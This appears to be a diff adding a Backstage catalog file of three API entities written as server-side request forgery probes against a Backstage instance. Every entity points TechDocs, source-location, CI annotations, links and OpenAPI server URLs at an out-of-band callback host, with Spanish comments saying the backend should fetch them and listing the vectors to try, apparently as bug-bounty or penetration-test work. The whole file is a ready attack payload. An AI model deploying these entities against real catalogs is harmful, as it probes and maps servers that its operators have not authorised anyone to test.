@@ -1,0 +1,117 @@
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-techdocs-api
+  title: SSRF TechDocs API Test
+  description: Testing backend SSRF through TechDocs with API type
+  annotations:
+    github.com/project-slug: newuserx00/business
+    # Backend debería fetchear esto al procesar TechDocs
+    backstage.io/techdocs-ref: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/techdocs-backend
+    # También intentamos con source location
+    backstage.io/source-location: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/source-backend
+  tags:
+    - ssrf-backend-test
+    - techdocs-test
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  # Esta definición la carga el FRONTEND (tu navegador)
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: SSRF TechDocs Test API
+      version: 1.0.0
+      description: Frontend endpoint - check interact.sh for backend requests
+    servers:
+      - url: https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun
+        description: Frontend server (tu navegador hace estos requests)
+    paths:
+      /frontend-test:
+        get:
+          summary: Frontend Test (tu navegador)
+          description: Este request lo hace TU navegador cuando clickeas Execute
+          responses:
+            '200':
+              description: Success from frontend
+      /backend-should-call-this:
+        get:
+          summary: Backend Test
+          description: El backend debería llamar esto al procesar techdocs-ref o source-location
+          responses:
+            '200':
+              description: Success from backend
+
+---
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-source-location-api
+  title: SSRF Source Location API Test
+  description: Testing backend SSRF specifically through source-location annotation
+  annotations:
+    github.com/project-slug: newuserx00/business
+    # Source location - el backend puede intentar clonar/validar esto
+    backstage.io/source-location: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/git-repo
+  tags:
+    - ssrf-backend-test
+    - source-location-test
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: SSRF Source Location Test
+      version: 1.0.0
+      description: Testing if backend validates source-location URLs
+    servers:
+      - url: https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun
+    paths:
+      /source-test:
+        get:
+          summary: Source validation test
+          responses:
+            '200':
+              description: Success
+
+---
+apiVersion: backstage.io/v1alpha1
+kind: API
+metadata:
+  name: ssrf-multi-vector-api
+  title: SSRF Multi-Vector API Test
+  description: Multiple SSRF vectors in one API definition
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/vector1
+    backstage.io/source-location: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/vector2
+    circleci.com/project-slug: dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/vector3
+    jenkins.io/job-full-name: dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/vector4
+  links:
+    - url: https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/link1
+      title: External Link Test
+      icon: link
+  tags:
+    - ssrf-multi-vector
+spec:
+  type: openapi
+  lifecycle: experimental
+  owner: security-team
+  definition: |
+    openapi: 3.0.0
+    info:
+      title: Multi-Vector SSRF Test
+      version: 1.0.0
+      description: Testing multiple potential SSRF vectors
+    servers:
+      - url: https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun
+    paths:
+      /multi-vector:
+        get:
+          summary: Multi-vector test
+          responses:
+            '200':
+              description: Check interact.sh for all vectors
